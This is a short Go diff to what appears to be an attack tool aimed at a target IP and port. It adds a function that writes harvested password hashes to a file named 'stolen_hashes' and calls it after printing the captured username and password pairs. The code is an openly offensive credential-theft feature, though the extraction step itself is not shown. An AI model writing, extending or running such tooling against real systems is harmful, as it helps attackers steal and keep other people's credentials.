@@ -319,6 +319,24 @@ func SysMsgNB(msg string) {
 	return
 }
 
+func SaveHashes(creds []Person) (success bool, message string) {
+	const filename string = "stolen_hashes"
+
+	SysMsgNB(fmt.Sprintf("saving stolen hashes to \"%s\"", filename))
+
+	fptr, err := os.Create(filename)
+	if err != nil {
+		return false, err.Error()
+	}
+	defer fptr.Close()
+
+	for i := range creds {
+		fptr.Write([]byte(fmt.Sprintf("%s\n", creds[i].Password)))
+	}
+
+	return true, fmt.Sprintf("password hashes saved to \"%s\"", filename)
+}
+
 func main() {
 	var targetPort int
 	var targetIP string
@@ -375,6 +393,12 @@ func main() {
 	for i := range creds {
 		SucMsg(fmt.Sprintf("%s:%s", creds[i].Name, creds[i].Password))
 	}
+	success, message = SaveHashes(creds)
+	if !success {
+		ErrMsg(message)
+		os.Exit(1)
+	}
+	SucMsg(message)
 	return
 }
 
